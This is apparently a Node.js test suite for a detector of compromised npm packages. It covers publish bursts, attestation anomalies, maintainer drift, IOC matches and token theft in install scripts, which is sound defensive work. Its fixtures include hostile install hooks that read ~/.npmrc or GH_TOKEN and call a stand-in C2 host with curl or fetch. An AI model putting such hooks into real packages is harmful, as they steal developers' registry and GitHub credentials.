import { test, mock } from 'node:test';
import assert from 'assert/strict';
import { scan, clearSiblingCache } from '../backend/detectors/mini-shai-hulud/index.js';

function mockResponse(body, status = 200, headers = {}) {
  return new Response(typeof body === 'string' ? body : JSON.stringify(body), {
    status,
    headers: new Headers({ 'Content-Type': 'application/json', ...headers }),
  });
}

function makeMockFetch(routes) {
  return async (url) => {
    const urlStr = typeof url === 'string' ? url : url.toString();
    for (const [pattern, handler] of routes) {
      if (urlStr.includes(pattern)) {
        return handler(urlStr);
      }
    }
    throw new Error(`Unexpected fetch: ${urlStr}`);
  };
}

const BURST_TIME_MAP = {
  '1.0.0': '2024-01-01T00:00:00.000Z',
  '2.0.0': '2026-05-20T00:00:00.000Z',
  '2.0.1': '2026-05-20T00:15:00.000Z',
  '2.0.2': '2026-05-20T00:29:00.000Z',
};

const BURST_VERSIONS_MAP = {
  '1.0.0': { _npmUser: { name: 'legacy-user' } },
  '2.0.0': { _npmUser: { name: 'legacy-user' } },
  '2.0.1': { _npmUser: { name: 'legacy-user' } },
  '2.0.2': { _npmUser: { name: 'legacy-user' } },
};

const MSH_SHA512 = 'sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';

/* ───────── Test 1: Burst ≥3 versions in 30 min → D1_BURST ───────── */

test('MSH: burst ≥3 versions in 30 min fires D1_BURST', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);

  const f = findings[0];
  assert.equal(f.id, 'MINI_SHAI_HULUD');
  assert.equal(f.severity, 'high');
  const ev = JSON.parse(f.evidence);
  assert.ok(ev.triggeredChecks.includes('D1_BURST'));
  assert.equal(ev.burstWindow.versionCount, 3);
  assert.equal(ev.waveAttribution, 'unknown');
});

/* ───────── Test 2: Burst 2 versions in 30 min → silent ───────── */

test('MSH: burst 2 versions in 30 min = no finding', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = {
    time: {
      '1.0.0': '2026-05-20T00:00:00.000Z',
      '1.0.1': '2026-05-20T00:15:00.000Z',
    },
  };
  const pkgJson = { name: 'test-pkg', version: '1.0.1', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 0);
});

/* ───────── Test 3: Burst at exact boundary (3 versions, window edge) ───────── */

test('MSH: burst 3 versions at window boundary triggers', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = {
    time: {
      '1.0.0': '2026-05-20T00:00:00.000Z',
      '1.0.1': '2026-05-20T00:29:30.000Z',
      '1.0.2': '2026-05-20T00:30:00.000Z',
    },
  };

  const pkgJson = { name: 'test-pkg', version: '1.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D1_BURST'));
  assert.equal(ev.burstWindow.versionCount, 3);
});

/* ───────── Test 4: Sibling 2+ with co-temporal burst → D2_SIBLING ───────── */

test('MSH: sibling 2+ with co-temporal burst fires D2_SIBLING', async (t) => {
  clearSiblingCache();

  t.mock.method(globalThis, 'fetch', makeMockFetch([
    ['%40antv%2Fg2', () => mockResponse({
      name: '@antv/g2',
      time: {
        '1.0.0': '2024-01-01T00:00:00.000Z',
        '2.0.0': '2026-05-20T00:00:00.000Z',
        '2.0.1': '2026-05-20T00:15:00.000Z',
        '2.0.2': '2026-05-20T00:28:00.000Z',
      },
    })],
    ['%40antv%2Fg6', () => mockResponse({
      name: '@antv/g6',
      time: {
        '1.0.0': '2024-01-01T00:00:00.000Z',
        '2.0.0': '2026-05-20T00:05:00.000Z',
        '2.0.1': '2026-05-20T00:20:00.000Z',
        '2.0.2': '2026-05-20T00:29:00.000Z',
      },
    })],
  ]));

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: 'test-pkg',
    version: '2.0.2',
    scripts: { test: 'node test.js' },
    dependencies: {
      '@antv/g2': '^2.0.0',
      '@antv/g6': '^2.0.0',
    },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2_SIBLING'));
  assert.ok(ev.siblingPackages.includes('@antv/g2'));
  assert.ok(ev.siblingPackages.includes('@antv/g6'));
});

/* ───────── Test 5: Sibling 1 with burst → no D2_SIBLING ───────── */

test('MSH: sibling 1 with burst = no D2_SIBLING', async (t) => {
  clearSiblingCache();

  t.mock.method(globalThis, 'fetch', makeMockFetch([
    ['%40antv%2Fg2', () => mockResponse({
      name: '@antv/g2',
      time: {
        '1.0.0': '2024-01-01T00:00:00.000Z',
        '2.0.0': '2026-05-20T00:00:00.000Z',
        '2.0.1': '2026-05-20T00:15:00.000Z',
        '2.0.2': '2026-05-20T00:28:00.000Z',
      },
    })],
    ['%40antv%2Fx6', () => mockResponse({
      name: '@antv/x6',
      time: { '1.0.0': '2024-01-01T00:00:00.000Z', '1.1.0': '2025-01-01T00:00:00.000Z' },
    })],
  ]));

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: 'test-pkg',
    version: '2.0.2',
    scripts: { test: 'node test.js' },
    dependencies: {
      '@antv/g2': '^2.0.0',
      '@antv/x6': '^1.0.0',
    },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(!ev.triggeredChecks.includes('D2_SIBLING'));
  assert.equal(ev.siblingPackages, null);
});

/* ───────── Test 6: SLSA sub-60s attestation gap → D3_SLSA + critical ───────── */

test('MSH: SLSA sub-60s attestation gap fires D3_SLSA with critical severity', async (t) => {
  t.mock.method(globalThis, 'fetch', makeMockFetch([
    ['attestations/test-pkg/2.0.2', () => mockResponse({
      attestations: [{
        timestamp: '2026-05-20T00:29:30.000Z',
        predicate: {
          runDetails: { builder: { id: 'https://github.com/actions/runner' } },
        },
      }],
    })],
    ['attestations/test-pkg/2.0.1', () => mockResponse({ attestations: [] })],
    ['attestations/test-pkg/2.0.0', () => mockResponse({ attestations: [] })],
  ]));

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const f = findings[0];
  assert.equal(f.severity, 'critical');
  const ev = JSON.parse(f.evidence);
  assert.ok(ev.triggeredChecks.includes('D3_SLSA'));
  assert.ok(ev.attestationAnomalies.some(a => a.includes('Sub-60s')));
});

/* ───────── Test 7: SLSA first-ever attestation in burst window → D3_SLSA ───────── */

test('MSH: SLSA first-ever attestation in burst fires D3_SLSA', async (t) => {
  t.mock.method(globalThis, 'fetch', makeMockFetch([
    ['attestations/test-pkg/2.0.2', () => mockResponse({
      attestations: [{
        timestamp: '2026-05-20T01:30:00.000Z',
        predicate: {
          runDetails: { builder: { id: 'https://github.com/actions/runner' } },
        },
      }],
    })],
    ['attestations/test-pkg/2.0.1', () => mockResponse({ status: 404 })],
    ['attestations/test-pkg/2.0.0', () => mockResponse({ status: 404 })],
  ]));

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3_SLSA'));
  assert.ok(ev.attestationAnomalies.some(a => a.includes('First-ever SLSA attestation')));
});

/* ───────── Test 8: SLSA builder mismatch → D3_SLSA ───────── */

test('MSH: SLSA unrecognized builder ID fires D3_SLSA', async (t) => {
  t.mock.method(globalThis, 'fetch', makeMockFetch([
    ['attestations/test-pkg/2.0.2', () => mockResponse({
      attestations: [{
        timestamp: '2026-05-20T01:30:00.000Z',
        predicate: {
          runDetails: { builder: { id: 'https://evil.c2-server.com/builder' } },
        },
      }],
    })],
    ['attestations/test-pkg/2.0.1', () => mockResponse({ attestations: [] })],
    ['attestations/test-pkg/2.0.0', () => mockResponse({ attestations: [] })],
  ]));

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3_SLSA'));
  assert.ok(ev.attestationAnomalies.some(a => a.includes('builder')));
});

/* ───────── Test 9: SLSA no anomaly (gap > 60s, known builder) → no D3_SLSA ───────── */

test('MSH: SLSA no anomaly = no D3_SLSA', async (t) => {
  t.mock.method(globalThis, 'fetch', makeMockFetch([
    ['attestations/test-pkg/2.0.2', () => mockResponse({
      attestations: [{
        timestamp: '2026-05-20T00:31:00.000Z',
        predicate: {
          runDetails: { builder: { id: 'https://github.com/actions/runner' } },
        },
      }],
    })],
    ['attestations/test-pkg/2.0.1', () => mockResponse({
      attestations: [{
        timestamp: '2026-05-20T00:16:00.000Z',
        predicate: {
          runDetails: { builder: { id: 'https://github.com/actions/runner' } },
        },
      }],
    })],
    ['attestations/test-pkg/2.0.0', () => mockResponse({
      attestations: [{
        timestamp: '2026-05-20T00:01:00.000Z',
        predicate: {
          runDetails: { builder: { id: 'https://github.com/actions/runner' } },
        },
      }],
    })],
  ]));

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(!ev.triggeredChecks.includes('D3_SLSA'));
  assert.equal(ev.attestationAnomalies, null);
  assert.equal(findings[0].severity, 'high');
});

/* ───────── Test 10: Maintainer publisher drift < 10 min → D4_MAINTAINER ───────── */

test('MSH: maintainer publisher drift < 10 min fires D4_MAINTAINER', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const DRIFT_TIME_MAP = {
    '1.0.0': '2024-01-01T00:00:00.000Z',
    '2.0.0': '2026-05-20T00:00:00.000Z',
    '2.0.1': '2026-05-20T00:07:00.000Z',
    '2.0.2': '2026-05-20T00:15:00.000Z',
  };

  const registryMeta = {
    time: DRIFT_TIME_MAP,
    versions: {
      '1.0.0': { _npmUser: { name: 'legacy-user' } },
      '2.0.0': { _npmUser: { name: 'legacy-user' } },
      '2.0.1': { _npmUser: { name: 'new-compromised-user' } },
      '2.0.2': { _npmUser: { name: 'new-compromised-user' } },
    },
  };

  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D4_MAINTAINER'));
});

/* ───────── Test 11: Maintainer same user all versions → no D4_MAINTAINER ───────── */

test('MSH: maintainer same user all versions = no D4_MAINTAINER', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = {
    time: BURST_TIME_MAP,
    versions: {
      '1.0.0': { _npmUser: { name: 'same-user' } },
      '2.0.0': { _npmUser: { name: 'same-user' } },
      '2.0.1': { _npmUser: { name: 'same-user' } },
      '2.0.2': { _npmUser: { name: 'same-user' } },
    },
  };

  const pkgJson = { name: 'test-pkg', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(!ev.triggeredChecks.includes('D4_MAINTAINER'));
});

/* ───────── Test 12: IOC packageScope match → D5_IOC ───────── */

test('MSH: IOC packageScope match fires D5_IOC', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = {
    time: BURST_TIME_MAP,
    versions: {
      '1.0.0': { _npmUser: { name: 'atool' } },
      '2.0.0': { _npmUser: { name: 'atool' } },
      '2.0.1': { _npmUser: { name: 'atool' } },
      '2.0.2': { _npmUser: { name: 'atool' } },
    },
  };

  const pkgJson = { name: '@antv/g2', version: '2.0.2', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const f = findings[0];
  const ev = JSON.parse(f.evidence);
  assert.ok(ev.triggeredChecks.includes('D5_IOC'));
  assert.equal(ev.waveAttribution, 'wave2-antv');
});

/* ───────── Test 13: IOC sha512 match → D5_IOC ───────── */

test('MSH: IOC sha512 match fires D5_IOC', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = {
    time: BURST_TIME_MAP,
    versions: {
      '1.0.0': { _npmUser: { name: 'legacy-user' }, dist: { integrity: MSH_SHA512 } },
      '2.0.0': { _npmUser: { name: 'legacy-user' }, dist: { integrity: 'sha512-diff' } },
      '2.0.1': { _npmUser: { name: 'legacy-user' }, dist: { integrity: 'sha512-diff2' } },
      '2.0.2': { _npmUser: { name: 'legacy-user' }, dist: { integrity: 'sha512-diff3' } },
    },
  };

  const pkgJson = { name: '@antv/g2', version: '1.0.0', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const f = findings[0];
  assert.equal(f.severity, 'critical');
  const ev = JSON.parse(f.evidence);
  assert.ok(ev.triggeredChecks.includes('D5_IOC'));
  const shaMatch = ev.iocMatches.find(m => m.type === 'sha512');
  assert.ok(shaMatch, 'Expected sha512 IOC match');
  assert.equal(shaMatch.package, '@antv/g2');
});

/* ───────── Test 14: IOC publisher outside compromise window → no D5_IOC ───────── */

test('MSH: IOC publisherAccount outside compromise window = no D5_IOC', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = {
    time: {
      '1.0.0': '2026-05-19T23:59:00.000Z',
      '2.0.0': '2026-05-20T00:00:00.000Z',
      '2.0.1': '2026-05-20T00:15:00.000Z',
      '2.0.2': '2026-05-20T00:29:00.000Z',
    },
    versions: {
      '1.0.0': { _npmUser: { name: 'atool' } },
      '2.0.0': { _npmUser: { name: 'atool' } },
      '2.0.1': { _npmUser: { name: 'atool' } },
      '2.0.2': { _npmUser: { name: 'atool' } },
    },
  };

  const pkgJson = { name: 'test-pkg', version: '1.0.0', scripts: { test: 'node test.js' } };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.ok(findings.length > 0);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(!ev.triggeredChecks.includes('D5_IOC'));
  assert.equal(ev.waveAttribution, 'unknown');
});

/* ───────── Test 15: TokenExfil NPM_TOKEN read → D6_EXFIL ───────── */

test('MSH: token exfil NPM_TOKEN in install script fires D6_EXFIL', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: 'test-pkg',
    version: '2.0.2',
    scripts: {
      install: 'node -e "console.log(process.env.NPM_TOKEN)"',
      test: 'node test.js',
    },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D6_EXFIL'));
  assert.ok(ev.installScriptSnippets.length > 0);
});

/* ───────── Test 16: TokenExfil ~/.npmrc read → D6_EXFIL ───────── */

test('MSH: token exfil ~/.npmrc read fires D6_EXFIL', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: 'test-pkg',
    version: '2.0.2',
    scripts: {
      postinstall: 'cat ~/.npmrc && curl http://c2.example.com/steal',
      test: 'node test.js',
    },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D6_EXFIL'));
});

/* ───────── Test 17: TokenExfil legitimate script → no D6_EXFIL ───────── */

test('MSH: token exfil legitimate install script = no D6_EXFIL', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: 'test-pkg',
    version: '2.0.2',
    scripts: {
      install: 'node build.js && npm run compile',
      test: 'node test.js',
    },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(!ev.triggeredChecks.includes('D6_EXFIL'));
});

/* ───────── Test 18: Wave attribution @tanstack → wave1-tanstack ───────── */

test('MSH: wave attribution @tanstack scope = wave1-tanstack', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: '@tanstack/router',
    version: '2.0.2',
    scripts: { test: 'node test.js' },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.equal(ev.waveAttribution, 'wave1-tanstack');
});

/* ───────── Test 19: Wave attribution @antv → wave2-antv ───────── */

test('MSH: wave attribution @antv scope = wave2-antv', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: '@antv/g2',
    version: '2.0.2',
    scripts: { test: 'node test.js' },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.equal(ev.waveAttribution, 'wave2-antv');
});

/* ───────── Test 20: Clean package → empty findings ───────── */

test('MSH: clean package with no signals returns empty findings', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const pkgJson = { name: 'clean-pkg', version: '1.0.0', scripts: { test: 'node test.js' } };
  const registryMeta = {
    time: { '1.0.0': '2024-01-01T00:00:00.000Z' },
    versions: { '1.0.0': { _npmUser: { name: 'developer' } } },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 0);
});

/* ───────── Test 21: Verify IOC from file loads without error ───────── */

test('MSH: IOC seed file loads correctly', async (t) => {
  const { checkIOC, reloadIOCData } = await import('../backend/detectors/mini-shai-hulud/d5-ioc-check.js');
  reloadIOCData();
  const result = await checkIOC('@antv/g2', '1.0.0', null, null, { '1.0.0': '2026-05-24T00:00:00.000Z' });
  assert.ok(result.triggered, 'Expected @antv scope IOC to match');
  assert.ok(result.matches.some(m => m.type === 'packageScope'));
});

/* ───────── Test 22: preinstall hook with NPM_TOKEN fires D6_EXFIL ───────── */

test('MSH: token exfil preinstall hook with GH_TOKEN fires D6_EXFIL', async (t) => {
  t.mock.method(globalThis, 'fetch', async () => { throw new Error('fetch should not be called'); });

  const registryMeta = { time: BURST_TIME_MAP, versions: BURST_VERSIONS_MAP };
  const pkgJson = {
    name: 'test-pkg',
    version: '2.0.2',
    scripts: {
      preinstall: 'node -e "process.env.GH_TOKEN && fetch(\'http://c2.example.com/steal\')"',
      test: 'node test.js',
    },
  };

  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D6_EXFIL'));
});
